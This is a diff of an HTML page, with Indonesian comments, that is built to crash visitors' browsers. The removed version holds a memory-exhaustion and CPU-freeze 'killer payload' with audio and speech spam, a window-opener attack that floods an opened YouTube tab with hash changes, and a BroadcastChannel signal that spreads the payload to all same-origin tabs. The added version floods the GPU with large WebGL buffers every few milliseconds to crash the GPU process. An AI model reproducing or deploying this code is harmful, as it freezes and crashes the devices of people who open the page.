@@ -2,126 +2,88 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Anomaly Detected</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GPU Process Crash</title>
 <style>
-  body { background: #111; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
-  button { padding: 15px; font-size: 18px; background: red; color: white; border: none; cursor: pointer; margin: 10px; width: 350px;}
+  body { background: #000; color: #f00; overflow: hidden; font-family: monospace; text-align: center; padding-top: 20vh; }
+  canvas { display: none; }
 </style>
 </head>
 <body>
-<h1>☢️ SYSTEM OVERRIDE ACTIVE</h1>
-
-<button id="btnInfectYouTube">1. Hancurkan Tab YouTube (Opener Attack)</button>
-<button id="btnInfectSameOrigin">2. Infeksi Semua Tab Same-Origin (Broadcast)</button>
+<h1>🔥 EXHAUSTING GPU PROCESS 🔥</h1>
+<p id="status">Mengalokasikan VRAM...</p>
 
 <script>
 (function () {
   'use strict';
 
+  var statusEl = document.getElementById('status');
+  var contextCount = 0;
+  var contexts = [];
+
   // ============================================
-  // THE KILLER PAYLOAD (OOM + FREEZE)
+  // FUNGSI PENGHANCUR GPU
   // ============================================
-  function triggerKillerPayload() {
-    console.log('[!] INITIATING ULTIMATE OOM...');
-    
-    var memoryHog = [];
-    var audioNodes = [];
+  function floodGPU() {
+    try {
+      // 1. Buat elemen canvas baru (tidak dimasukkan ke DOM agar ringan di CPU, tapi berat di GPU)
+      var canvas = document.createElement('canvas');
+      canvas.width = 4096;  // Resolusi tinggi memakan VRAM besar
+      canvas.height = 4096;
 
-    // 1. OOM BOMB (Mengalokasikan 500MB per 10ms)
-    setInterval(function() {
-      try {
-        var bigArray = new Uint8Array(500 * 1024 * 1024); // 500MB
-        bigArray.fill(1);
-        memoryHog.push(bigArray);
-      } catch(e) {}
-    }, 10);
+      // 2. Pilih API (WebGL 2.0 atau WebGL 1.0)
+      var gl = canvas.getContext('webgl2') || 
+               canvas.getContext('webgl') || 
+               canvas.getContext('experimental-webgl');
 
-    // 2. MAIN THREAD FREEZE (Blocking Loop)
-    setInterval(function() {
-      try {
-        // Memaksa CPU bekerja 100% selama 100ms setiap 100ms
-        var start = Date.now();
-        while(Date.now() - start < 100) {}
-      } catch(e) {}
-    }, 100);
+      if (!gl) return; // Jika diblokir, lewati
 
-    // 3. AUDIO/TTS SPAM
-    setInterval(function() {
-      try {
-        for (var i = 0; i < 50; i++) {
-          var ctx = new (window.AudioContext || window.webkitAudioContext)();
-          var osc = ctx.createOscillator();
-          osc.type = 'sawtooth';
-          osc.frequency.value = 12000;
-          osc.connect(ctx.destination);
-          osc.start(0);
-          audioNodes.push(osc);
+      // 3. Alokasi Buffer Besar di VRAM
+      var buffer = gl.createBuffer();
+      gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+      // Alokasi 256MB VRAM per context
+      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(64 * 1024 * 1024), gl.STATIC_DRAW);
 
-          var u = new SpeechSynthesisUtterance("SYSTEM FAILURE DETECTED");
-          window.speechSynthesis.speak(u);
-        }
-      } catch(e) {}
-    }, 50);
+      // 4. Paksa GPU untuk merender (Shader Compilation & Draw Call)
+      // Ini memaksa proses GPU bekerja sangat keras
+      var vsSource = `attribute vec4 aVertexPosition; void main() { gl_Position = aVertexPosition; }`;
+      var fsSource = `void main() { gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0); }`;
+      
+      var shader = gl.createShader(gl.VERTEX_SHADER);
+      gl.shaderSource(shader, vsSource);
+      gl.compileShader(shader);
+      
+      var program = gl.createProgram();
+      gl.attachShader(program, shader);
+      gl.linkProgram(program);
+      gl.useProgram(program);
+      gl.drawArrays(gl.TRIANGLES, 0, 3);
+
+      // Simpan context agar tidak di-Garbage Collect
+      contexts.push(gl);
+      contextCount++;
+
+      statusEl.innerText = "WebGL Contexts Allocated: " + contextCount;
+
+      // Setiap 200 context, log ke console
+      if (contextCount % 200 === 0) {
+        console.log("[!] GPU Contexts: " + contextCount);
+      }
+
+    } catch (e) {
+      console.log("GPU Error (Expected when VRAM full):", e.message);
+    }
+
+    // 5. Loop super cepat (setiap 5ms)
+    // Browser biasanya membatasi WebGL context (max ~16-32 per halaman).
+    // Jika batas ini bisa ditembus, proses GPU akan langsung crash.
+    setTimeout(floodGPU, 5); 
   }
 
   // ============================================
-  // METODE 1: WINDOW OPENER HIJACK (YouTube)
+  // EKSEKUSI
   // ============================================
-  document.getElementById('btnInfectYouTube').onclick = function() {
-    // Buka YouTube di tab baru
-    var ytWin = window.open('https://www.youtube.com', '_blank');
-    if (!ytWin) { alert('Popup diblokir!'); return; }
-
-    alert('YouTube dibuka. Tunggu 2 detik, lalu tab ini akan memaksa YouTube untuk FREEZE.');
-
-    setTimeout(function() {
-      if (!ytWin || ytWin.closed) return;
-
-      console.log('Memulai serangan Opener ke YouTube...');
-      
-      // TRIK: Memaksa YouTube untuk melakukan navigasi hash secara brutal
-      // Ini memicu event 'hashchange' di YouTube terus menerus hingga CPU penuh.
-      setInterval(function() {
-        try {
-          if (ytWin.closed) return;
-          
-          // 1. Spam hash change (memicu render ulang YouTube)
-          ytWin.location.hash = '#crash_' + Math.random();
-          
-          // 2. Spam window.name
-          ytWin.name = "HACKED_" + Math.random();
-          
-          // 3. Spam focus & blur (memicu layout thrashing)
-          ytWin.focus();
-          ytWin.blur();
-          
-        } catch(e) {}
-      }, 5); // Setiap 5 milidetik
-
-      // JANGKITKAN OOM KE TAB ANOMALI INI SENDIRI
-      triggerKillerPayload();
-
-    }, 2000);
-  };
-
-  // ============================================
-  // METODE 2: BROADCAST CHANNEL (Same-Origin)
-  // ============================================
-  document.getElementById('btnInfectSameOrigin').onclick = function() {
-    var channel = new BroadcastChannel('anomaly_kill_channel');
-    channel.postMessage({ action: 'KILL' });
-    alert('Sinyal dikirim ke semua tab (artha231.github.io).');
-    triggerKillerPayload();
-  };
-
-  // Listener untuk tab lain yang terinfeksi
-  var listenerChannel = new BroadcastChannel('anomaly_kill_channel');
-  listenerChannel.onmessage = function(e) {
-    if (e.data.action === 'KILL') {
-      console.log('Menerima sinyal dari tab anomali!');
-      triggerKillerPayload();
-    }
-  };
+  setTimeout(floodGPU, 500);
 
 })();
 </script>
